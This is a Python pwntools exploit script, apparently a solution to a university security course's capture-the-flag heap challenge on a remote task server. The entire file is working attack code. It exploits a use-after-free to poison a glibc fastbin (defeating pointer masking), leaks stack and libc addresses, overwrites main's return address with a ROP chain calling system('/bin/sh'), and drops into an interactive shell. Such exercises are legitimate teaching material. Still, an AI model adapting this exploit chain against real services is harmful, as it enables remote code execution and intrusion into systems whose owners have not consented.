#!/usr/bin/env python3

import pwn

exe = pwn.ELF("./vuln_patched")
libc = pwn.ELF("./libc.so.6")
#ld = pwn.ELF("./ld-linux-x86-64.so.2")

pwn.context.arch = 'amd64'

# 1) docker compose -f debug.yml up
# 2) docker exec -ti $(docker ps --quiet --filter 'ancestor=softsec/stringbins') /bin/bash
# 3) gdb -p "$(pgrep -n vuln)"

conn = pwn.remote('tasks.ws24.softsec.rub.de', 33738)
#conn = pwn.remote('127.0.0.1', 1024)


# 1) ALLOC: malloc 20 Bytes memory (chunk 0)
allocated_size = 24
conn.recvuntil(b'-- 6: exit\n')
conn.sendline(b'1')
conn.recvuntil(b'How long is the string?\n')
conn.sendline(str(allocated_size).encode('ascii'))
conn.recvuntil(b'characters to 0x')
chunk_pointer_0 = int(conn.recv(12), 16)
print(f'chunk 0 at: {hex(chunk_pointer_0)} (addr: {hex(chunk_pointer_0-2*8)})')
conn.recvuntil(b'.\n')
conn.sendline(b'A'*allocated_size)
conn.recvuntil(b'.\n')


# 2) CHANGE: leak a stack pointer 
conn.recvuntil(b'-- 6: exit\n')
conn.sendline(b'5')
conn.recvuntil(b'How many characters should I update?\n')
conn.sendline(b'1')
conn.recvuntil(b'bytes to temporary 0x')
stack_pointer = int(conn.recv(12), 16)
print(f'stack at {hex(stack_pointer)}')
conn.recvuntil(b'.\n')
conn.sendline(b'A')
conn.recvuntil(b'What string index should I update?\n')
conn.sendline(b'0')


# 3) DEALLOC: free memory (chunk 0) , UAF
conn.recvuntil(b'-- 6: exit\n')
conn.sendline(b'2')
conn.recvuntil(b'What string index should I free?\n')
conn.sendline(b'0')
conn.recvuntil(b'.\n')



# Note: chunk 0 if now top of free chunks (overrite next)
# heap is deterministic, once we know one pointer we know all
chunk_pointer_strings_p = chunk_pointer_0 + 0x20
chunk_pointer_strings_l = chunk_pointer_strings_p + 0x20
print(f'chunk for strings_p at {hex(chunk_pointer_strings_p)} (addr: {hex(chunk_pointer_strings_p-2*8)})')
print(f'chunk for strings_l at {hex(chunk_pointer_strings_l)} (addr: {hex(chunk_pointer_strings_l-2*8)})')



# 4) CHANGE: write arbitrary data into chunk (now part of fastbin)
conn.recvuntil(b'-- 6: exit\n')
conn.sendline(b'5')
conn.recvuntil(b'How many characters should I update?\n')
#conn.sendline(str(allocated_size).encode('ascii'))
conn.sendline(b'8') # only override next pointer
conn.recvuntil(b'.\n')
# we point to strings_p
desired_pointer = chunk_pointer_strings_p - 16 # next pointer points 8 byte above chunk (16 above next as size alos there)
address_of_next_in_chunk = chunk_pointer_0
masked_pointer = (desired_pointer) ^ ((address_of_next_in_chunk >> 12))
conn.sendline(pwn.p64(masked_pointer))
conn.recvuntil(b'What string index should I update?\n')
conn.sendline(b'0')



# 5) ALLOC: get pointer back (we can ignore this, just to put *next as top in fastbin-0x20)
allocated_size = 24
conn.recvuntil(b'-- 6: exit\n')
conn.sendline(b'1')
conn.recvuntil(b'How long is the string?\n')
conn.sendline(str(allocated_size).encode('ascii'))
conn.recvuntil(b'characters to 0x')
chunk_pointer_1 = int(conn.recv(12), 16)
print(f'chunk 1 (is chunk 0) at: {hex(chunk_pointer_1)}')
conn.recvuntil(b'.\n')
conn.sendline(b'A'*allocated_size)
conn.recvuntil(b'.\n')



# 6) ALLOC: get the next malicious pointer to strings_p from malloc
# it is import that our chunk is 32 (24+8) Bytes, as chunk from strings_p is also 32 Bytes
# malloc() asserts that the size we return via malloc is indeed correct
allocated_size = 24
conn.recvuntil(b'-- 6: exit\n')
conn.sendline(b'1')
conn.recvuntil(b'How long is the string?\n')
conn.sendline(str(allocated_size).encode('ascii'))
conn.recvuntil(b'characters to 0x')
chunk_pointer_2 = int(conn.recv(12), 16)
print(f'chunk 4 at: {hex(chunk_pointer_2)}')
conn.recvuntil(b'.\n')
# stack_return_main is return address from main (back to libc)
# we can leak it to get libcpointer and then start writing ropchain here => gets triggert when main returns
stack_return_main = stack_pointer + 136
stack_return_main_plus_16 = stack_return_main + 16
print(f'address stack where puts is: {hex(stack_return_main)}')
print(f'writing ropchain at: {hex(stack_return_main)}')
conn.sendline(pwn.p64(stack_return_main) + pwn.p64(stack_return_main_plus_16) + b'\00'*8)
conn.recvuntil(b'.\n')
# ! from now on, do not call alloc again to keep heap in takt



# 7) PRINT: leak libc address
conn.recvuntil(b'-- 6: exit\n')
conn.sendline(b'4')
conn.recvuntil(b'What string index should I print?\n')
conn.sendline(b'0')
conn.recvuntil(b' = ')
raw_address = conn.recv(6)
address = pwn.u64(raw_address+b'\00\00', endieness='big')
libc_base = address - (libc.symbols['__libc_start_main'] +2 - 0x38)
libc.address = libc_base
#system = libc_base + libc.symbols['system']
#print(hex(system))



# build ropchain
rop = pwn.ROP(libc)
rop.call(rop.ret)
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])



# 8) CHANGE: write ropchain
# write first 16 bytes of ropchain
conn.recvuntil(b'-- 6: exit\n')
conn.sendline(b'5')
conn.recvuntil(b'How many characters should I update?\n')
conn.sendline(b'16')
conn.recvuntil(b'.\n')
conn.sendline(rop.chain()[0:16])
conn.recvuntil(b'What string index should I update?\n')
conn.sendline(b'0')
# write second 16 bytes of ropchain
conn.recvuntil(b'-- 6: exit\n')
conn.sendline(b'5')
conn.recvuntil(b'How many characters should I update?\n')
conn.sendline(b'16')
conn.recvuntil(b'.\n')
conn.sendline(rop.chain()[16:32])
conn.recvuntil(b'What string index should I update?\n')
conn.sendline(b'1')



# 9) trigger ropchain
conn.recvuntil(b'-- 6: exit\n')
conn.sendline(b'6')

# cat /flag
conn.interactive()
